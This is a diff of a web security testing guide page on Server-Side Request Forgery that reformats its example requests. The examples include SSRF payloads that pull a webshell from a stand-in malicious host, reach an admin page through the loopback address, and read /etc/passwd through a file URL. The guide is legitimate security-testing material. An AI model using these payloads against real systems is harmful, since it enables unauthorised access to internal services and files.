@@ -1,5 +1,9 @@
 # Testing for Server-Side Request Forgery
 
+|ID          |
+|------------|
+|WSTG-INPV-19|
+
 ## Summary
 
 Often web applications may have to interact with internal or external resources in order to provide certain functionality, with the expectation that only the service providing that functionality will be used, but often such functionality processes user data and if not handled properly it can open the door for injection attacks that are called Server-side Request Forgery (SSRF). A successful SSRF attack can grant the attacker access to restricted actions, internal services, or internal files within the application or the organization. In some cases it can even lead to Remote Code Execution (RCE).
@@ -14,24 +18,33 @@ Often web applications may have to interact with internal or external resources 
 
 When testing for SSRF we are trying to trick the server into loading/writing unintended content. The most common test is for local and remote file inclusion, but there is another facet to SSRF, a trust relationship that often arises with server-side request forgery where the application server is able to interact with other back-end systems that are not directly reachable by users. These systems often have non-routable private IP addresses or are restricted to certain hosts. Since they are protected by the network topology, they often lack more sophisticated controls. However internal systems often contain sensitive data or functionality.
 
-If we have the following request:
+``` http
+GET https://example.com/page?page=about.php
+```
 
-`https://example.com/page?page=about.php`, we can try the following payloads:
+If we have the above request we can test with the following payloads:
 
-Return the content of an external resource like a webshell.
+**Loading the contents of a file:**
 
-`https://example.com/page?page=https://malicioussite.com/shell.php`
+```http
+GET https://example.com/page?page=https://malicioussite.com/shell.php
+```
+
+**Get access to a restricted page:**
+
+```http
+GET https://example.com/page?page=http://localhost/admin
+
+OR
+
+GET https://example.com/page?page=http://127.0.0.1/admin
+
+```
 
 Use the loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host then you have enough privileges to directly access the `admin` page.
 These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, are often what makes SSRF into a critical vulnerability.
 
-`https://example.com/page?page=http://localhost/admin`
-
-or
-
-`https://example.com/page?page=http://127.0.0.1/admin`
-
-Fetch a local file
+**Fetch a local file:**
 
 `https://example.com/page?page=file:///etc/passwd`
 
